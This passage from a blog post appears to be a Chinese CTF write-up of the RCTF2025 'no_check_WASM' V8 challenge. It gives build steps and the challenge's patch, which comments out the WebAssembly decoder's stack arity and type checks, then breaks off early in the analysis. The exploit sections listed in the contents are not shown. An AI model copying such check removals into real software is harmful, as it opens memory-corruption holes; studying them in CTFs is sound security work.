<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="环境搭建1234git reset --hard 42f5ff65d12f0ef9294fa7d3875feba938a81904gclient sync -Dgit apply &lt; .&#x2F;patch.diffgn args out&#x2F;x64.release  修改一下编译参数 12345678910is_component_build &#x3D; falseis_debug &#x3D; falsetarget">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF2025-no_check_WASM复现">
<meta property="og:url" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/index.html">
<meta property="og:site_name" content="PuH4ck3rX&#39;s Blog">
<meta property="og:description" content="环境搭建1234git reset --hard 42f5ff65d12f0ef9294fa7d3875feba938a81904gclient sync -Dgit apply &lt; .&#x2F;patch.diffgn args out&#x2F;x64.release  修改一下编译参数 12345678910is_component_build &#x3D; falseis_debug &#x3D; falsetarget">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211041049303.png">
<meta property="og:image" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051515193.png">
<meta property="og:image" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051730977.png">
<meta property="og:image" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211052421882.png">
<meta property="article:published_time" content="2025-12-10T14:00:00.000Z">
<meta property="article:modified_time" content="2025-12-10T21:29:22.201Z">
<meta property="article:author" content="PuH4ck3rX">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211041049303.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>RCTF2025-no_check_WASM复现</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">h0m3</a></li><!--
     --><!--
       --><li><a href="/about/">ab0ut</a></li><!--
     --><!--
       --><li><a href="/archives/">art1cl3s</a></li><!--
     --><!--
       --><li><a href="/links/">l1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s3arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&text=RCTF2025-no_check_WASM复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&is_video=false&description=RCTF2025-no_check_WASM复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF2025-no_check_WASM复现&body=Check out this article: http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&name=RCTF2025-no_check_WASM复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&t=RCTF2025-no_check_WASM复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#addressOf"><span class="toc-number">3.1.</span> <span class="toc-text">addressOf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fakeObj"><span class="toc-number">3.2.</span> <span class="toc-text">fakeObj</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AAR-AAW"><span class="toc-number">3.3.</span> <span class="toc-text">AAR &amp;&amp; AAW</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%B2%99%E7%AE%B1%E7%9A%84%E5%9F%BA%E5%9D%80-wasm-stack"><span class="toc-number">3.4.</span> <span class="toc-text">泄露沙箱的基址&amp;wasm stack</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.5.</span> <span class="toc-text">遇到的问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">3.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        RCTF2025-no_check_WASM复现
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">PuH4ck3rX</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-12-10T14:00:00.000Z" class="dt-published" itemprop="datePublished">2025-12-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/V8/">V8</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/V8/" rel="tag">V8</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 42f5ff65d12f0ef9294fa7d3875feba938a81904</span><br><span class="line">gclient sync -D</span><br><span class="line">git apply &lt; ./patch.diff</span><br><span class="line">gn args out/x64.release</span><br></pre></td></tr></table></figure>

<p>修改一下编译参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">is_component_build = false</span><br><span class="line">is_debug = false</span><br><span class="line">target_cpu = &quot;x64&quot;</span><br><span class="line">v8_enable_sandbox = true</span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br><span class="line">dcheck_always_on = false</span><br><span class="line">symbol_level = 2</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autoninja -C out/x64.release d8 </span><br></pre></td></tr></table></figure>

<p>diff文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index 478c7cb3c75..b4700b6cab2 100644</span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ -4213,51 +4213,51 @@ Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"></span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">-                       String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, Version));</span><br><span class="line">+  // global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">+  //                      String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, Version));</span><br><span class="line"></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;print&quot;, FunctionTemplate::New(isolate, Print));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;printErr&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, PrintErr));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;write&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, WriteStdout));</span><br><span class="line">-  if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span><br><span class="line">-                         FunctionTemplate::New(isolate, WriteFile));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadFile));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadBuffer));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">-  // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">-  // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">-  // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line">-  if (!options.omit_quit) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;performance&quot;,</span><br><span class="line">-                       Shell::CreatePerformanceTemplate(isolate));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span><br><span class="line">-</span><br><span class="line">-  // Prevent fuzzers from creating side effects.</span><br><span class="line">-  if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span><br><span class="line">-</span><br><span class="line">-  if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">-                         Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line">-  &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;printErr&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, PrintErr));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;write&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, WriteStdout));</span><br><span class="line">+  // if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span><br><span class="line">+  //                        FunctionTemplate::New(isolate, WriteFile));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadFile));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadBuffer));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">+  // // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">+  // // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">+  // // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line">+  // if (!options.omit_quit) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;performance&quot;,</span><br><span class="line">+  //                      Shell::CreatePerformanceTemplate(isolate));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span><br><span class="line">+</span><br><span class="line">+  // // Prevent fuzzers from creating side effects.</span><br><span class="line">+  // if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span><br><span class="line">+</span><br><span class="line">+  // if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">+  //                        Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line">+  // &#125;</span><br><span class="line"></span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line">diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h</span><br><span class="line">index b65ba5b9675..163fc536138 100644</span><br><span class="line">--- a/src/wasm/function-body-decoder-impl.h</span><br><span class="line">+++ b/src/wasm/function-body-decoder-impl.h</span><br><span class="line">@@ -7878,27 +7878,27 @@ class WasmFullDecoder : public WasmDecoder&lt;ValidationTag, decoding_mode&gt; &#123;</span><br><span class="line">     // if the current code is reachable even if it is spec-only reachable.</span><br><span class="line">     if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                   !control_.back().unreachable())) &#123;</span><br><span class="line">-      if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">-        this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">-                          arity, merge_description, actual);</span><br><span class="line">-        return false;</span><br><span class="line">-      &#125;</span><br><span class="line">-      // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">-      Value* stack_values = stack_.end() - arity;</span><br><span class="line">-      for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">-        Value&amp; val = stack_values[i];</span><br><span class="line">-        Value&amp; old = (*merge)[i];</span><br><span class="line">-        if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">-          this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">-                            merge_description, i, old.type.name().c_str(),</span><br><span class="line">-                            val.type.name().c_str());</span><br><span class="line">-          return false;</span><br><span class="line">-        &#125;</span><br><span class="line">-        if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">-          // Upcast type on the stack to the target type of the label.</span><br><span class="line">-          val.type = old.type;</span><br><span class="line">-        &#125;</span><br><span class="line">-      &#125;</span><br><span class="line">+      // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">+      //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">+      //                     arity, merge_description, actual);</span><br><span class="line">+      //   return false;</span><br><span class="line">+      // &#125;</span><br><span class="line">+      // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">+      // Value* stack_values = stack_.end() - arity;</span><br><span class="line">+      // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">+      //   Value&amp; val = stack_values[i];</span><br><span class="line">+      //   Value&amp; old = (*merge)[i];</span><br><span class="line">+      //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">+      //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">+      //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">+      //                       val.type.name().c_str());</span><br><span class="line">+      //     return false;</span><br><span class="line">+      //   &#125;</span><br><span class="line">+      //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">+      //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">+      //     val.type = old.type;</span><br><span class="line">+      //   &#125;</span><br><span class="line">+      // &#125;</span><br><span class="line">       return true;</span><br><span class="line">     &#125;</span><br><span class="line">     // Unreachable code validation starts here.</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先分析一下diff文件到底patch了什么，第一处patch就是把d8的一些功能删了，但是和漏洞利用核心关系不大 <del>用来恶心人的</del>，只是增大了exp的wasm代码部分构建难度，本地做题的时候可以不用打，<del>如果你看到这里已经打了那就去重新编译d8吧bushi</del> 重点看第二处，可以看到具体patch位置在</p>
<p><code>src/wasm/function-body-decoder-impl.h</code>  的<code>WasmFullDecoder</code>类中，他把merge point相关的检测注释掉了，现在不管什么都返回true了</p>
<p>那我们找到对应的源码进行分析 在源码7879行，注释掉了是因为打过patch了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                  !control_.back().unreachable())) &#123;</span><br><span class="line">      // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">      //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">      //                     arity, merge_description, actual);</span><br><span class="line">      //   return false;</span><br><span class="line">      // &#125;</span><br><span class="line">      // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">      // Value* stack_values = stack_.end() - arity;</span><br><span class="line">      // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">      //   Value&amp; val = stack_values[i];</span><br><span class="line">      //   Value&amp; old = (*merge)[i];</span><br><span class="line">      //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">      //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">      //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">      //                       val.type.name().c_str());</span><br><span class="line">      //     return false;</span><br><span class="line">      //   &#125;</span><br><span class="line">      //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">      //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">      //     val.type = old.type;</span><br><span class="line">      //   &#125;</span><br><span class="line">      // &#125;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么问题来了，我们如何进入到这个有漏洞的分支中，先看一下他的上层代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">V8_INLINE bool TypeCheckStackAgainstMerge(Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">  uint32_t arity = merge-&gt;arity;</span><br><span class="line">  uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">  // Handle trivial cases first. Arity 0 is the most common case.</span><br><span class="line">  if (arity == 0 &amp;&amp; (!strict_count || actual == 0)) return true;</span><br><span class="line">  // Arity 1 is still common enough that we handle it separately (only doing</span><br><span class="line">  // the most basic subtype check).</span><br><span class="line">  if (arity == 1 &amp;&amp; (strict_count ? actual == arity : actual &gt;= arity)) 